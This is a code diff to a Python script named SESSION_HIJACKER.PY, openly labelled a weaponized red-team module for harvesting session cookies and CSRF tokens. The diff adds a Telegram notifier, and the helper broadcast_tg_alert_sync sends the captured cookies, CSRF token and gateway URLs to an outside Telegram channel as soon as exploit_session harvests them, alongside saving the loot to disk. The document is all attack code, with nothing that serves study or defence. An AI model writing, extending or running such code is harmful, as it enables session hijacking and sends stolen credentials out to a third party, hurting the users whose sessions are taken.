@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-SESSION_HIJACKER.PY — Advanced Session Seeding & Token Replay (Multi-Project Edition)
+SESSION_HIJACKER.PY — Advanced Session Seeding & Token Replay (Multi-Project Edition with Telegram Telemetry)
 Weaponized Red-Team Module: Dynamic target resolution, multi-framework CSRF harvesting,
-robust cookie-jar state synchronization, and centralized loot persistence.
+robust cookie-jar state synchronization, centralized loot persistence, and real-time Telegram broadcasting.
 """
 import sys
 import json
@@ -10,12 +10,26 @@ import httpx
 from bs4 import BeautifulSoup
 from urllib.parse import urlsplit
 
-# Import centralized framework loot exfiltration and telemetry
+# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 # Suppress insecure HTTPS warnings if self-signed certs are used in pre-production
 httpx._config.DEFAULT_CIPHERS += ":HIGH:!MEDIUM:!LOW:!NULL"
+
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
+    try:
+        import asyncio
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            import asyncio
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
 
 def exploit_session(target_url):
     """
@@ -83,13 +97,15 @@ def exploit_session(target_url):
             print(f"[+] Captured Session Cookie Jar: {captured_cookies}")
             print(f"[+] Harvested Replay CSRF Token: {csrf_val if csrf_val else 'None (Stateless JWT / Header Auth)'}")
             
-            # STREAM TELEMETRY & PERSIST HARVESTED SESSION SEED TO DISK
             harvest_data = {
                 "base_url": base_url,
                 "cookies": captured_cookies,
                 "csrf_token": csrf_val,
                 "gateway_url": used_url
             }
+
+            # STREAM LIVE TELEMETRY, DISK PERSISTENCE & TELEGRAM NOTIFICATION
+            broadcast_tg_alert_sync("Session Seed Harvested", harvest_data)
             stream_proof("SESSION_SEED_HARVESTED", used_url, {"headers": headers}, resp.text[:300], harvest_data)
             save_session_loot(
                 target=base_url,
